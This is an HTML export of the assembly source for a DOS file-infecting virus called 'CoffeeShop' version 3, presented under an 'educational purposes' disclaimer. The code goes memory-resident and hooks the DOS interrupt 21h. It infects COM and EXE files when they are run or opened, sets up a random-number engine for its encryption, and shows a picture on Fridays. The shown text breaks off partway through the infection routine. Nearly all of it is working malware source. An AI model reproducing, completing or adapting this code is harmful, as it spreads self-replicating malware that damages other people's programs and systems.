<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;*  CoffeeShop VIRUS     version 3</span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;*  Use MASM 4.0 to compile this source</span><span class="sc0">
</span><span class="sc1">;*  (other assemblers will probably not produce the same result)</span><span class="sc0">
</span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;*  Disclaimer:</span><span class="sc0">
</span><span class="sc1">;*  This file is only for educational purposes. The author takes no</span><span class="sc0">
</span><span class="sc1">;*  responsibility for anything anyone does with this file. Do not</span><span class="sc0">
</span><span class="sc1">;*  modify this file!</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">
 

                </span><span class="sc9">.RADIX</span><span class="sc0">  </span><span class="sc2">16</span><span class="sc0">


</span><span class="sc5">_TEXT</span><span class="sc0">           </span><span class="sc9">segment</span><span class="sc0">

                </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">_TEXT</span><span class="sc0">


</span><span class="sc5">VERSION</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">PICLEN</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">beeld</span><span class="sc0">            </span><span class="sc1">;length of picture routine</span><span class="sc0">
</span><span class="sc5">FILELEN</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">last</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">first</span><span class="sc0">            </span><span class="sc1">;length of virus</span><span class="sc0">
</span><span class="sc5">FILEPAR</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">FILELEN</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0F</span><span class="sc4">)/</span><span class="sc2">10</span><span class="sc0">       </span><span class="sc1">;length of virus in paragraphs</span><span class="sc0">
</span><span class="sc5">VIRPAR</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00D0</span><span class="sc0">                    </span><span class="sc1">;space for resident virus</span><span class="sc0">
</span><span class="sc5">WORKPAR</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0160</span><span class="sc0">                    </span><span class="sc1">;work space for engine</span><span class="sc0">
</span><span class="sc5">STACKOFF</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1000</span><span class="sc0">                    </span><span class="sc1">;Stack offset</span><span class="sc0">
</span><span class="sc5">DATAPAR</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0050</span><span class="sc0">                    </span><span class="sc1">;extra memory allocated</span><span class="sc0">
</span><span class="sc5">BUFLEN</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1C</span><span class="sc0">                      </span><span class="sc1">;length of buffer</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              data area for virus</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">00E0</span><span class="sc0">

</span><span class="sc5">mutstack</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">oldlen</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">oi21</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">minibuf</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              data area for engine</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

</span><span class="sc5">add_val</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">xor_val</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">xor_offset</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">where_len</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">where_len2</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">flags</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Begin of virus, installation in memory</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">0100</span><span class="sc0">

</span><span class="sc5">first</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">next</span><span class="sc0">                    </span><span class="sc1">;get IP</span><span class="sc0">
</span><span class="sc5">next</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                </span><span class="sc1">;SI = begin virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;save registers</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc0">                   </span><span class="sc1">;DOS version &gt;= 3.1?</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">030A</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">not_install</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">33DA</span><span class="sc0">                 </span><span class="sc1">;already resident?</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0A5</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">not_install</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">                   </span><span class="sc1">;adjust memory-size</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">5A</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_install</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">VIRPAR</span><span class="sc4">+</span><span class="sc5">WORKPAR</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">not_install</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],(</span><span class="sc5">VIRPAR</span><span class="sc4">+</span><span class="sc5">WORKPAR</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;copy program to top</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">FILELEN</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521</span><span class="sc0">                 </span><span class="sc1">;get original int21 vector</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">oi21</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">oi21</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ni21</span><span class="sc0">          </span><span class="sc1">;install new int21 handler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">33DBh</span><span class="sc0">                </span><span class="sc1">;init. random nr. generator</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2A</span><span class="sc0">                   </span><span class="sc1">;ask date</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">                    </span><span class="sc1">;friday ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_install</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2C</span><span class="sc0">                   </span><span class="sc1">;ask time</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">;sec = 0 ?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">not_install</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">33DC</span><span class="sc0">                 </span><span class="sc1">;show picture</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21</span><span class="sc0">

</span><span class="sc5">not_install</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;restore registers</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">4Dh</span><span class="sc0">    </span><span class="sc1">;COM or EXE ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">entryE</span><span class="sc0">

</span><span class="sc5">entryC</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">BUFLEN</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">entryE</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">                   </span><span class="sc1">;calculate CS</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0E</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">                             </span><span class="sc1">;restore SS and SP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;push new CS on stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;push new IP on stack</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0CBh</span><span class="sc0">                    </span><span class="sc1">;retf</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Interupt 24 handler</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">

</span><span class="sc5">ni24</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">;to avoid 'Abort, Retry, ...'</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Interupt 21 handler</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">

</span><span class="sc5">ni21</span><span class="sc4">:</span><span class="sc0">           </span><span class="sc6">pushf</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">33DA</span><span class="sc0">                 </span><span class="sc1">;install-check ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_ic</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A500</span><span class="sc4">+</span><span class="sc5">VERSION</span><span class="sc0">        </span><span class="sc1">;return a signature</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
                </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">not_ic</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">;save registers</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">33DBh</span><span class="sc0">                </span><span class="sc1">;rnd init ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">not_ri</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_init</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">no_infect</span><span class="sc0">

</span><span class="sc5">not_ri</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">33DC</span><span class="sc0">                 </span><span class="sc1">;show picture?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">show_pic</span><span class="sc0">

</span><span class="sc5">not_pi</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00</span><span class="sc0">                 </span><span class="sc1">;execute ?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_it</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6C00</span><span class="sc0">                 </span><span class="sc1">;open DOS 4.0+ ?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_infect</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_infect</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

</span><span class="sc5">do_it</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect</span><span class="sc0">

</span><span class="sc5">no_infect</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;restore registers</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">

</span><span class="sc5">org21</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">oi21</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;call to old int-handler</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Show picture</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">

</span><span class="sc5">show_pic</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">no_infect</span><span class="sc0">     </span><span class="sc1">;push return adres on stack</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,((</span><span class="sc5">VIRPAR</span><span class="sc4">*</span><span class="sc2">10</span><span class="sc4">)+</span><span class="sc2">0100</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;move picture routine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">beeld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">PICLEN</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">                   </span><span class="sc1">;calculate segment registers</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">low</span><span class="sc0"> </span><span class="sc5">VIRPAR</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;push picture adres on stack</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0100</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0CBh</span><span class="sc0">                    </span><span class="sc1">;(retf) goto picture routine</span><span class="sc0">


</span><span class="sc1">;******************************************************************************</span><span class="sc0">
</span><span class="sc1">;*              Tries to infect the file</span><span class="sc0">
</span><span class="sc1">;******************************************************************************</span><span class="sc0">

</span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">cld</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;copy filename to CS:0000</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0080</span><span class="sc0">
</span><span class="sc5">namemove</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">moved</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">char_ok</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'z'</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">char_ok</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">                   </span><span class="sc1">;convert to upper case</span><span class="sc0">
</span><span class="sc5">char_ok</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">namemove</span><span class="sc0">
